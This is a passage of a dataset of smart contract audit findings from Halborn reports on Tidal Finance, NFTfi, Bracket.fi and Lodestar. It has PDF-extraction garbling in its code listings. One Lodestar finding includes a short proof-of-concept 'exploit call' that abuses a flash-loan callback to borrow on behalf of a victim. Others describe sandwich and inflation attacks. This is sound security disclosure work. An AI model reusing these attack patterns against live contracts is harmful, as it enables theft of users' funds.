percentage_ ) function setGovernor ( address governor_ ) function setCommittee ( address committee_ ) function setTrustedForwarder ( address trustedForwarder_ ) Risk Level: Likelihood - 2 Impact - 2 18 Recommendation: Consider declaring events at the end of function. Events can be used to detect the end of the operation. Remediation Plan: RISK ACCEPTED: Tidal.Finance considers it to be appropriate not declaring these events because most of these functions will be called only once. 19 ", "labels": ["Halborn", "Tidal_Finances", "Severity: Low"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Tidal_Finance_Smart_Contracts_Security_Audit_Halborn_v1_1.pdf", "body": "In the BaseRelayRecipient.sol,the contract uses the floating pragma Contracts should be deployed with the same compiler version ^0.6.12. and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma, for example, either an outdated pragma version that might introduce bugs that affect the contract system negatively or a recently released pragma version which has not been extensively tested. Reference: ConsenSys Diligence - Lock pragmas Code Location: BaseRelayRecipient Line #2 Listing 5: BaseRelayRecipient.sol (Lines 1) 1 pragma solidity ^0.6.12;  This is an example where the floating pragma is used. ^0.6.12. Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider locking the pragma version. It is recommended not to use floating pragma in production. Apart from just locking the pragma version in the code, the sign (>=) need to be removed. It is possible to lock the pragma version both in truffle-config.js and in hardhat.config.js if you use HardHat framework for the deployment. 20 Remediation Plan: SOLVED: Tidal.Finance locked the pragma version (0.6.12) in commit 6 ba4efc80292769ebd8a36d3ade87b7ac5bb6ea0. 21 ", "labels": ["Halborn", "Tidal_Finances", "Severity: Low"]}, {"title": "OWNER CAN RENOUNCE OWNERSHIP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Tidal_Finance_Smart_Contracts_Security_Audit_Halborn_v1_1.pdf", "body": "The Owner of the contract is usually the account which deploys the contract. As a result, the Owner is able to perform some privileged actions. In the smart contracts, the renounceOwnership function is used to renounce being Owner. Otherwise, if the ownership was not transferred before, the contract will never have an Owner, which is dangerous. All contracts are affected which is derived from Ownable contract. Code Location: PremiumCalculator.sol Line #11 Bonus.sol Line #18 AssetManager.sol Line #9 Registry.sol Line #8 CommitteeAlpha.sol Line #18 Buyer.sol Line #22 Staking.sol Line #18 Risk Level: Likelihood - 2 Impact - 3 Recommendation: Its recommended that the Owner is not able to call renounceOwnership without transferring the Ownership to other address before. In addition, if a multi-signature wallet is used, calling renounceOwnership function should be confirmed for two or more users. As an other solution, Renounce Ownership functionality can be disabled with the following line. 22 Listing 6: Disable RenounceOwnerShip (Lines 1) 1 2 3 function renounceOwnership () public override onlyOwner { revert ( \" can 't renounceOwnership here \"); // not possible with this smart contract } Remediation Plan: to ACKNOWLEDGED: multi-signature wallet or DAO will indirectly control it. Tidal.Finance transfer Owners will Timelock and 23 ", "labels": ["Halborn", "Tidal_Finances", "Severity: Low"]}, {"title": "INFINITE MINTING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Tidal_Finance_Smart_Contracts_Security_Audit_Halborn_v1_1.pdf", "body": "During the test, it has been observed that an attacker could mint any amount of USDC. Although, the comment is written on the top of the code, the code should be deleted from the repository. Code Location: MockUSDC.sol Line #3 Listing 7: MockUSDC.sol (Lines 45) 44 45 46 47 // For test purpose . function mint ( uint256 amount_ ) external { _mint ( msg . sender , amount_ ); } Recommendation: It is recommend to delete related code from the repository. Remediation Plan: NOT APPLICABLE: Tidal.Finance claims that MockUSDC.sol file is for testing purposes only and will never be used in production. 24 ", "labels": ["Halborn", "Tidal_Finances", "Severity: Informational"]}, {"title": "USE OF INLINE ASSEMBLY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Tidal_Finance_Smart_Contracts_Security_Audit_Halborn_v1_1.pdf", "body": "Inline assembly is a way to access the Virtual Machine at a low level. This discards several important safety features in Solidity. Code Location: GovernanceToken.sol Line #248 GovernorAlpha.sol Line #39 StakingHelper.sol Line #20 Listing 8: GovernanceToken.sol (Lines ) 248 249 250 251 252 constructor () public { uint chainId ; assembly { chainId := chainid } Listing 9: BaseRelayRecipient.sol (Lines ) 35 function _msgSender () internal override virtual view returns ( address payable ret ) { 36 37 38 39 40 41 42 43 44 if ( msg . data . length >= 24 && isTrustedForwarder ( msg . sender )) { // At this point we know that the sender is a trusted forwarder , // so we trust that the last bytes of msg . data are the verified sender address . // extract sender address from the end of msg . data assembly { ret := shr (96 , calldataload ( sub ( calldatasize () ,20) ) ) } } else { return msg . sender ; 25 45 46 } } Risk Level: Likelihood - 1 Impact - 1 Recommendation: The contracts should avoid using inline assembly because it interacts with the EVM (Ethereum Virtual Machine) at a low level. An attacker could bypass many essential safety features of Solidity. Remediation Plan: RISK ACCEPTED: Tidal.Finance assumes the risk because the use of assembly is needed. 26 ", "labels": ["Halborn", "Tidal_Finances", "Severity: Informational"]}, {"title": "MISSING RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Tidal_Finance_Smart_Contracts_Security_Audit_Halborn_v1_1.pdf", "body": "To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the withdraw function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against reentrancy attacks. Code Location: Staking.sol Line #259 Listing 10: Staking.sol (Lines 259) 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 function claim () external { UserInfo storage user = userInfo [ _msgSender () ]; updatePool () ; uint256 pending = user . amount . mul ( poolInfo . accRewardPerShare ). div ( UNIT_PER_SHARE ). sub ( user . rewardDebt ); uint256 rewardTotal = user . rewardAmount . add ( pending ); IERC20 ( registry . tidalToken () ). transfer ( _msgSender () , rewardTotal ); user . rewardAmount = 0; user . rewardDebt = user . amount . mul ( poolInfo . accRewardPerShare ). div ( UNIT_PER_SHARE ); emit Claim ( _msgSender () , rewardTotal ); } 27 Risk Level: Likelihood - 1 Impact - 1 Recommendation: In the Staking.sol , the claim() function is missing nonReentrant guard. Use the nonReentrant or mutex modifier to avoid introducing future vulnerabilities. Remediation Plan: SOLVED: 7984f69a292180c9393b4eedeeef40ef5217d2e1. Tidal.Finance added Re-entrancy protection in commit 28 ", "labels": ["Halborn", "Tidal_Finances", "Severity: Informational"]}, {"title": "BLOCK TIMESTAMP ALIAS USAGE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Tidal_Finance_Smart_Contracts_Security_Audit_Halborn_v1_1.pdf", "body": "The global variable now alias of the block.timestamp does not necessarily hold the current time, and may not be accurate. Miners can influence the value of now to perform Maximal Extractable Value (MEV) attacks. There is no guarantee that the value is correct, only that it is higher than the previous blocks timestamp. Code Location: WeekManaged.sol Line #11,15 Listing 11: WeekManaged.sol (Lines 11,15) function _timeExtra () internal virtual view returns ( uint256 ); function getCurrentWeek () public view returns ( uint256 ) { return ( now + offset + _timeExtra () ) / (7 days ); uint256 public offset = 4 days ; } 4 abstract contract WeekManaged { 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 } } function getNow () public view returns ( uint256 ) { return now + _timeExtra () ; function getUnlockWeek () public view returns ( uint256 ) { return getCurrentWeek () + 2; function getUnlockTime ( uint256 time_ ) public view returns ( 23 uint256 ) { require ( time_ + offset > (7 days ) , \" Time not large enough \" ); 29 return (( time_ + offset ) / (7 days ) + 2) * (7 days ) - offset ; 24 25 26 } } Risk Level: Likelihood - 1 Impact - 1 Recommendation: Use block.number instead of now to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: NOT APPLICABLE: Tidal.Finance considers it appropriate to use block. timestamp for their business logic. In addition, the timescale used in the project is higher than 900 seconds. 30 3.10 (HAL-10) POSSIBLE MISUSE OF PUBLIC FUNCTIONS - INFORMATIONAL ", "labels": ["Halborn", "Tidal_Finances", "Severity: Informational"]}, {"title": "GAS OVER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_eth_nftfi_Collection_Offer_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In all the loops, the counter variable is incremented using i++. It is known that, in loops, using ++i costs less gas per iteration than i++. Code Location: DirectLoanBaseMinimal.sol - Line 305: for (uint256 i = 0; i < _permittedErc20s.length; i++){ - Line 374: for (uint256 i = 0; i < _erc20s.length; i++){ Proof of Concept: For example, based in the following test contract: Listing 1: Test.sol 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.9; 3 4 contract test { 5 6 7 8 9 10 11 12 13 } } function postiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; i ++) { } } function preiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; ++ i) { } We can see the difference in the gas costs: 12 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use ++i instead of i++ to increment the value of an uint variable inside a loop to save some gas. This is not applicable outside of loops. Remediation Plan: ACKNOWLEDGED: The \\client team acknowledged this issue. 13 ", "labels": ["Halborn", "NFTfi_eth_nftfi_Collection_Offer", "Severity: Informational"]}, {"title": "SOLC 0.8.4 COMPILER VERSION CONTAINS MULTIPLE BUGS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_eth_nftfi_Collection_Offer_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Presently, the smart contracts have configured the floating pragma set to 0.8.0 or fixed pragma to 0.8.4 (e.g. DirectLoanFixedCollectionOffer .sol). The latest solidity compiler version 0.8.16 fixed important bugs in the compiler. The version 0.8.4 is missing all these fixes: 0.8.9, 0.8.13, 0.8.14, 0.8.15, 0.8.16. The official Soliditys recommendations are: when deploying contracts, you should use the latest released version of Solidity. Apart from exceptional cases, only the latest version receives security fixes. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to set the floating pragma at least to 0.8.16 version. Remediation Plan: ACKNOWLEDGED: The \\client team acknowledged this issue. 14 MANUAL TESTING 15 Halborn performed several manual tests in the DirectLoanFixedCollectionOffer .sol contract: G N I T S E T L A U N A M 16 G N I T S E T L A U N A M 17 G N I T S E T L A U N A M 18 The manual tests were focused on testing the main functions of this contract:  acceptOffer()  getPayoffAmount()  updateMaximumLoanDuration()  updateAdminFee()  drainERC20Airdrop()  setERC20Permit()  setERC20Permits()  drainERC721Airdrop()  drainERC1155Airdrop()  mintObligationReceipt()  renegotiateLoan()  payBackLoan()  liquidateOverdueLoan()  pullAirdrop()  wrapCollateral() G N I T S E T L A U N A M 19  cancelLoanCommitmentBeforeLoanHasBegun()  getWhetherNonceHasBeenUsedForUser()  getERC20Permit() No significant issues were found during the manual tests. G N I T S E T L A U N A M 20 ", "labels": ["Halborn", "NFTfi_eth_nftfi_Collection_Offer", "Severity: Informational"]}, {"title": "ERC", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_Channels_and_EpochChannels_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the Channel contract, when transferring the commission from the con- tract to the owner the transfer function is not wrapped with a require statement, meaning the return value of the transfer function is ignored. While failed USDC transfers are reverted, it is important to note that some failed ERC-20 token transfers may return a boolean false instead, which may lead to processing transactions that otherwise should be reverted. Listing 1: contracts/Channel.sol (Line 362) 362 IERC20 ( usdc ). transfer ( payable ( owner () ) , v. commishUSDC ); Risk Level: Likelihood - 1 Impact - 4 Recommendation: Wrap the transfer function with a require statement to ensure failed ERC20 token transfers are always reverted. Remediation Plan: SOLVED: ERC20 token transfers were wrapped with a require statement which the transaction revert unless transfer returns true. Commit ID: 6fe5621f23b7cd09bc4d3396b9573c18c154d36c. 16 ", "labels": ["Halborn", "Bracket_fi_Channels_and_EpochChannels", "Severity: Low"]}, {"title": "CENTRALIZATION RISK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_Channels_and_EpochChannels_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The CNFT contract implements methods for the contract owner to mint and set policies. While the probability of this happening is very low, if the private keys of the owner account are compromised, a malicious user could potentially mint NFTs and use the setPolicy() function to steal other users policies. Listing 2: contracts/CNFT.sol (Line 56) external onlyBrkt 56 function setPolicy ( uint256 tokenId , ChanLib . CPolicy memory policy ) 57 58 59 { 60 61 } Policies [ tokenId ] = policy ; Risk Level: Likelihood - 1 Impact - 2 Recommendation: Remove the owner from the onlyBrkt() modifier. Remediation Plan: SOLVED: The contract owner was removed from the onlyBrkt modifier. Commit ID: 7aa426ee0a8f367aca5875267d9872bac05ec17d. 17 ", "labels": ["Halborn", "Bracket_fi_Channels_and_EpochChannels", "Severity: Informational"]}, {"title": "IMMUTABLE DEPENDENCIES OF THE EPOCH CHANNELS CONTRACT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_Channels_and_EpochChannels_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the EpochChannels contract, the addresses of the pricing contract and the Ethereum/USD Price Feed Oracle is set on initialization. How- ever, these addresses cannot be changed later on if those contracts are deprecated or their private keys are compromised. Listing 3: contracts/EpochChannels.sol (Line 70) __Ownable_init () ; __Pausable_init () ; __ReentrancyGuard_init () ; require ( _pricing != address (0) && _eth != address (0) , \" ZADDR \" ) 70 function initialize ( address _pricing , address _eth ) external  initializer { 71 72 73 74  ; 75 76 pricing = _pricing ; ETH = _eth ; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Implement a function to change the dependencies addresses. Remediation Plan: SOLVED: The Bracket team added the cngLinks functions to change dependency addresses. 18 Commit ID: 7aa426ee0a8f367aca5875267d9872bac05ec17d. 19 ", "labels": ["Halborn", "Bracket_fi_Channels_and_EpochChannels", "Severity: Informational"]}, {"title": "HARDCODED STATE VARIABLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_Channels_and_EpochChannels_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the EpochChannels contract, the minimum USD amount a user can invest in an Epoch Channel MIN_BUY_USD is hardcoded into the initialize function. Moreover, unlike other parameters, there is no setter function to change this parameter. In case this value needs to be changed, the contract needs to be redeployed. . Listing 4: contracts/EpochChannels.sol (Line 70) __Ownable_init () ; __Pausable_init () ; __ReentrancyGuard_init () ; require ( _pricing != address (0) && _eth != address (0) , \" ZADDR \" ) 70 function initialize ( address _pricing , address _eth ) external  initializer { 71 72 73 74  ; 75 76 77 78 79 80 81 82 pricing = _pricing ; ETH = _eth ; COMMISH = 975 e15 ; // 1 - 2.5% in 18 digits MAX_MULT = 19; MAX_DELAY = 180; // 3 min MIN_BUY_USD = 9 e18 ; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Implement a setter function for the MIN_BUY_USD state variable. 20 Remediation Plan: SOLVED: The Bracket team added the setMinBuyUSD function to change the MIN_BUY_USD state variable. Commit ID: 7aa426ee0a8f367aca5875267d9872bac05ec17d. 21 ", "labels": ["Halborn", "Bracket_fi_Channels_and_EpochChannels", "Severity: Informational"]}, {"title": "MISSING ZERO ADDRESS CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_Channels_and_EpochChannels_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Missing several zero address checks within the code base can lead to accidentally setting the eth or channel address to the 0 address. Code Location:  ChanConfig.sol: setEth(), initialize()  CNFT.sol: setChannel()  ChanMaxKeeper.sol: initialize(), cngLinks  ChanKeeper.sol: initialize(), cngLinks  ChanOffers.sol: cngLinks()  PriceProd.sol: initialize() Risk Level: Likelihood - 1 Impact - 1 Recommendation: Add a require() check for zero address for the addresses that impact core functionality and can lead to losses. Remediation Plan: SOLVED: The Bracket team implemented several zero address checks in above code locations. Commit ID: 7aa426ee0a8f367aca5875267d9872bac05ec17d. 22 ", "labels": ["Halborn", "Bracket_fi_Channels_and_EpochChannels", "Severity: Informational"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_Channels_and_EpochChannels_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The contract The contracts in scope use the floating pragma ^0.8.12. should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that affect the contract system negatively or a pragma version too new which has not been extensively tested. Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider locking the pragma version with known bugs for the compiler When possible, do not use floating pragma in the final live version. deployment. Specifying a fixed compiler version ensures that the bytecode produced does not vary between builds. This is especially important if you rely on bytecode-level verification of the code. Listing 5: contracts/EpochChannels.sol (Line 1) 1 // SPDX - License - Identifier : apache -2.0 2 pragma solidity 0.8.12; Remediation Plan: SOLVED: The pragma was modified to specify a fixed compiler version. Commit ID: 7aa426ee0a8f367aca5875267d9872bac05ec17d. 23 ", "labels": ["Halborn", "Bracket_fi_Channels_and_EpochChannels", "Severity: Informational"]}, {"title": "> 0 CONSUMES MORE GAS THAN != 0 FOR UINTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_Channels_and_EpochChannels_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The use of > sign consumes more gas than != sign. There are some cases where both can be used indistinctly, such as in unsigned integers where numbers cannot be negative, and as such, there is only a need to check that a number is not 0. Code Location: EpochChannel.sol: - Line 133, 171 and 193: require(_epoch > 0... - Line 230: require(_invId > 0... - Line 248: if (amt > 0){... Risk Level: Likelihood - 1 Impact - 1 Recommendation: Use != instead of > in cases where both can be used. Remediation Plans: SOLVED: > 0 was replaced by != 0 for uint comparison, where both can be used interchangeably. Commit ID: 7aa426ee0a8f367aca5875267d9872bac05ec17d. 24 MANUAL TESTING 25 In the manual testing phase, the following scenarios were simulated. The scenarios listed below were selected based on the severity of the vulnerabilities Halborn was testing the program for. 4.1 RE-ENTRANCY ATTACKS ", "labels": ["Halborn", "Bracket_fi_Channels_and_EpochChannels", "Severity: Informational"]}, {"title": "ANY USER CAN BORROW ON BEHALF OF ANOTHER USER THAT APPROVED THE PLOOPY CONTRACT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Lodestar_Finance_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the Ploopy contract, the receiveFlashLoan() function is used to handle all the logic when a flash loan is received from the Balancer contract: Listing 1: Ploopy.sol (Line 170) IERC20 [] memory tokens , uint256 [] memory amounts , uint256 [] memory feeAmounts , bytes memory userData 164 function receiveFlashLoan ( 165 166 167 168 169 ) external override nonReentrant { 170 if ( msg . sender != address ( BALANCER_VAULT )) revert UNAUTHORIZED ( '  balancer vault is not the sender '); 171 172 173 174 175 // additional checks ? UserData memory data = abi . decode ( userData , ( UserData )) ; if ( data . borrowedAmount != amounts [0] || data . borrowedToken !=  tokens [0]) revert FAILED ( ' borrowed amounts and / or borrowed tokens  do not match initially set values '); 176 177 178 179 180 181 182 183 184 185 186 // sanity check : flashloan has no fees if ( feeAmounts [0] > 0) revert FAILED ( ' balancer fee > 0 '); // account for some plvGLP specific logic if ( data . tokenToLoop == PLVGLP ) { // mint GLP . approval needed . uint256 glpAmount = REWARD_ROUTER_V2 . mintAndStakeGlp ( address ( data . borrowedToken ) , data . borrowedAmount , 0, 24 187 188 189 190 191 192 193 194 195 196 197 198 199 0 ); if ( glpAmount == 0) revert FAILED ( ' glp =0 '); // TODO whitelist this contract for plvGLP mint // mint plvGLP . approval needed . uint256 _oldPlvglpBal = PLVGLP . balanceOf ( address ( this )) ; GLP_DEPOSITOR . deposit ( glpAmount ); // check new balances and confirm we properly minted uint256 _newPlvglpBal = PLVGLP . balanceOf ( address ( this )) ; emit plvGLPBalance ( _newPlvglpBal ); require ( _newPlvglpBal > _oldPlvglpBal , \" glp deposit failed ,  new balance < old balance \" ); 200 201 202 203 204 } uint256 _finalBal ; // mint our respective token by depositing it into Lodestar 's  respective lToken contract ( approval needed ) 205 206 unchecked { lTokenMapping [ data . tokenToLoop ]. mint ( data . tokenToLoop .  balanceOf ( address ( this )) ); 207 lTokenMapping [ data . tokenToLoop ]. transfer ( data . user ,  lTokenMapping [ data . tokenToLoop ]. balanceOf ( address ( this )) ); 208 _finalBal = lTokenMapping [ data . tokenToLoop ]. balanceOf ( address (  this )); 209 210 211 emit lTokenBalance ( _finalBal ); require ( _finalBal == 0 , \" lToken balance not 0 at the end of  loop \"); } 212 213 214 215 // call borrowBehalf to borrow tokens on behalf of user lTokenMapping [ data . tokenToLoop ]. borrowBehalf ( data . borrowedAmount  , data . user ); 216 217 // repay loan , where msg . sender = vault data . tokenToLoop . safeTransferFrom ( data . user , msg . sender , data .  borrowedAmount ); 218 } The receiveFlashLoan() function has some access control mechanism in place: This function can only be called by the Balancer contract. 25 Although, any user is free to call the balancer.flashLoan() function passing it the address of the Looper: Listing 2: flashLoan() call (Lines 2,10) user : victim_address , tokenAmount : 10000 _000000 , borrowedToken : contract_USDC , borrowedAmount : 10000 _000000 , tokenToLoop : contract_USDC 1 UserData memory userData = UserData ({ 2 3 4 5 6 7 }) ; 8 9 // Exploit call 10 BALANCER_VAULT . flashLoan ( IFlashLoanRecipient ( contract_Ploopy , [  USDC ], [10000 _000000 ], abi . encode ( userData )) ; Balancer contract would call back the Ploopy.receiveFlashLoan() function and trigger a borrow on behalf of another user: lTokenMapping[data.tokenToLoop].borrowBehalf(data.borrowedAmount, data. user); The consequences: 1. Lowering the account liquidity of the users, being able to get them very close to a liquidation. 2. If the attack is performed with the plvGLP token, this will trig- ger a REWARD_ROUTER_V2.mintAndStakeGlp(address(data.borrowedToken), data .borrowedAmount, 0, 0) call. As the borrowedAmount is a user controlled parameter and the slippage is set to 0, the attacker can sandwich this call to get profit constantly from different users in the Lodestar protocol. 26 Proof of Concept: BVSS: AO:A/AC:L/AX:L/C:N/I:H/A:N/D:C/Y:N/R:N/S:U (10) Recommendation: is recommended Ploopy. It receiveFlashLoan() function that checks that tx.origin is equal to the userData.user field passed as parameter to this function. statement require add the to in a Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : 306d538a0b295fb96b37ccd774c27fb658b0538f. 27 ", "labels": ["Halborn", "Lodestar_Lodestar_Finance", "Severity: Critical"]}, {"title": "CETHERDELEGATOR DELEGATECALLS SOME CETHERUPGRADEABLE FUNCTIONS INCORRECTLY, ALWAYS REVERTING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Lodestar_Finance_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The CEtherDelegator is used as a proxy contract for the CEtherDelegate contract. The CEtherDelegator contract delegate calls to the implemen- tation (CEtherDelegate). Although, some of the functions implemented in the CEtherDelegator contract delegate calls functions selectors that do not exist in the CEtherDelegate contract. For example: Listing 3: CEtherDelegator.sol (Line 89) delegateToImplementation ( abi . encodeWithSignature ( \" mint ( uint256 88 function mint () external payable override { 89  ) \" , msg . value )); 90 } Listing 4: CEtherUpgradeable.sol (Line 38) 38 function mint () external payable { mintInternal ( msg . value ); 39 40 } Listing 5: CEtherDelegator.sol (Line 157) 156 function repayBorrow () external payable override { 157 delegateToImplementation ( abi . encodeWithSignature ( \" repayBorrow (  uint256 ) \" , msg . value )) ; 28 158 } Listing 6: CEtherUpgradeable.sol (Line 78) 78 function repayBorrow () external payable { 79 repayBorrowInternal ( msg . value ); 80 } Listing 7: CEtherDelegator.sol (Line 157) 156 function repayBorrowBehalf ( address borrower ) external payable  override { 157 delegateToImplementation ( abi . encodeWithSignature ( \"  repayBorrowBehalf ( address , uint256 ) \" , borrower , msg . value )) ; 158 } Listing 8: CEtherUpgradeable.sol (Line 78) 78 function repayBorrowBehalf ( address borrower ) external payable { 79 80 } repayBorrowBehalfInternal ( borrower , msg . value ); Listing 9: CEtherDelegator.sol (Lines 175-177) 174 function liquidateBorrow ( address borrower , CTokenInterface  cTokenCollateral ) external payable override { 175 176 delegateToImplementation ( abi . encodeWithSignature ( \" liquidateBorrow ( address , address ) \"  , borrower , cTokenCollateral ) 177 178 } ); Listing 10: CEtherUpgradeable.sol (Line 122) 122 function liquidateBorrow ( address borrower , CToken cTokenCollateral  ) external payable returns ( uint ) { 123  ; 124 125 } liquidateBorrowInternal ( borrower , msg . value , cTokenCollateral ) return NO_ERROR ; 29 These function calls will always revert, leaving the CEtherDelegator unusable. Functions affected:  CEtherDelegator.mint()  CEtherDelegator.repayBorrow()  CEtherDelegator.repayBorrowBehalf()  CEtherDelegator.liquidateBorrow() Proof of Concept: BVSS: AO:A/AC:L/AX:L/C:N/I:C/A:N/D:N/Y:N/R:N/S:U (10) Recommendation: It is recommended to correct in the CEtherDelegator contract the different abi.encodeWithSignature() calls to use the correct function signatures. Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : f62e743da12da115333ddedb25721cb9bde7f7d2. 30 ", "labels": ["Halborn", "Lodestar_Lodestar_Finance", "Severity: Critical"]}, {"title": "EMPTY MARKETS ARE VULNERABLE TO INFLATION ATTACKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Lodestar_Finance_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "This vulnerability has existed in the Compound v2 code since its launch, presenting itself when markets are launched with a collateral value in place but no depositors or following markets becoming empty due to user withdrawal post-launch. This issue exploits a rounding error that is present in the redeemFresh() function: Listing 11: CToken.sol (Line 520) 490 /* * 491 * @notice User redeems cTokens in exchange for the underlying  asset 492 * @dev Assumes interest has already been accrued up to the  current block 493 * @param redeemer The address of the account which is redeeming  the tokens 494 * @param redeemTokensIn The number of cTokens to redeem into  underlying ( only one of redeemTokensIn or redeemAmountIn may be  non - zero ) 495 * @param redeemAmountIn The number of underlying tokens to  receive from redeeming cTokens ( only one of redeemTokensIn or  redeemAmountIn may be non - zero ) */ 496 497 function redeemFresh ( address payable redeemer , uint redeemTokensIn  , uint redeemAmountIn ) internal { 498 require ( redeemTokensIn == 0 || redeemAmountIn == 0 , \" one of  redeemTokensIn or redeemAmountIn must be zero \" ); 499 500 /* exchangeRate = invoke Exchange Rate Stored () */ 31 501 Exp memory exchangeRate = Exp ({ mantissa :  exchangeRateStoredInternal () }) ; 502 503 504 505 506 507 508 uint redeemTokens ; uint redeemAmount ; /* If redeemTokensIn > 0: */ if ( redeemTokensIn > 0) { /* * We calculate the exchange rate and the amount of  underlying to be redeemed : 509 510 511 512 513 redeemTokens = redeemTokensIn redeemAmount = redeemTokensIn x exchangeRateCurrent * * */ redeemTokens = redeemTokensIn ; redeemAmount = mul_ScalarTruncate ( exchangeRate ,  redeemTokensIn ); 514 515 516 } else { /* * We get the current exchange rate and calculate the  amount to be redeemed : * * */ redeemTokens = redeemAmountIn / exchangeRate redeemAmount = redeemAmountIn redeemTokens = div_ ( redeemAmountIn , exchangeRate ); redeemAmount = redeemAmountIn ; } /* Fail if redeem not allowed */ uint allowed = comptroller . redeemAllowed ( address ( this ) , 517 518 519 520 521 522 523 524 525  redeemer , redeemTokens ); 526 527 528 529 530 531 532 533 534 535 536 537 538 539 if ( allowed != 0) { revert RedeemComptrollerRejection ( allowed ); } /* Verify market 's block number equals current block number */ if ( accrualBlockNumber != getBlockNumber () ) { revert RedeemFreshnessCheck () ; } /* Fail gracefully if protocol has insufficient cash */ if ( getCashPrior () < redeemAmount ) { revert RedeemTransferOutNotPossible () ; } 32 540 541 542 543 544 545 546 // /////////////////////// // EFFECTS & INTERACTIONS // ( No safe failures beyond this point ) /* * We write the previously calculated values into storage . * Note : Avoid token reentrancy attacks by writing reduced  supply before external transfer . 547 548 549 */ totalSupply = totalSupply - redeemTokens ; accountTokens [ redeemer ] = accountTokens [ redeemer ] -  redeemTokens ; 550 551 552 /* * We invoke doTransferOut for the redeemer and the  redeemAmount . * 553 Note : The cToken must handle variations between ERC -20 and  ETH underlying . 554 555 * * On success , the cToken has redeemAmount less of cash . doTransferOut reverts if anything goes wrong , since we can  't be sure if side effects occurred . 556 557 558 559 560 561 562 563 564 */ doTransferOut ( redeemer , redeemAmount ); /* We emit a Transfer event , and a Redeem event */ emit Transfer ( redeemer , address ( this ) , redeemTokens ); emit Redeem ( redeemer , redeemAmount , redeemTokens ); /* We call the defense hook */ comptroller . redeemVerify ( address ( this ) , redeemer , redeemAmount  , redeemTokens ); 565 } This is achieved by donating a large amount of the underlying asset to the market contract, manipulating the exchangeRate. 33 Proof of Concept: References:  Hundred Finance Hack Post Mortem  Hundred Finance exploit example BVSS: AO:A/AC:L/AX:M/C:N/I:N/A:N/D:C/Y:C/R:N/S:U (8.4) Recommendation: It is recommended to ensure that markets are never empty by minting small cToken (or equivalent) balances at the time of market creation, preventing the rounding error being used maliciously. A possible approach is following UniswapV2 implementation that permanently locks the first MINIMUM_LIQUIDITY tokens. 34 Remediation Plan: SOLVED: The Lodestar team is aware of this CompoundV2 issue and states that and have a team controlled wallet with some of each asset deposited in each market to always have a MINIMUM_LIQUIDITY in every market. Moreover, the Lodestar team updated the CToken implementation, so it ensures that there is always a minimum liquidity of 1e6 tokens in the market. Commit ID : 5bae12489d1bca1ae42265853f43d5749a4b0dc8. 35 ", "labels": ["Halborn", "Lodestar_Lodestar_Finance", "Severity: High"]}, {"title": "LOOPING WITH PLVGLP BORROWS USDC AND REPAYS WITH PLVGLP, ALWAYS 